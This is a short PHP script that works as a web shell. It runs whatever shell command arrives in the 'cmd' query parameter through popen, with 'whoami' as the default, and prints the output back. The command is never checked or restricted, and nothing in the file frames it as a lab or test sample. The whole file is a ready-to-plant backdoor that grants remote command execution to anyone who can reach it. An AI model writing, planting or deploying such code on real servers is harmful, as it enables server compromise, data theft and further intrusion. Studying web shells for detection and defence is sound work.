<?php
$cmd = $_GET['cmd'] ?? 'whoami';
$handle = popen($cmd . " 2>&1", "r");
echo stream_get_contents($handle);
pclose($handle);
?>
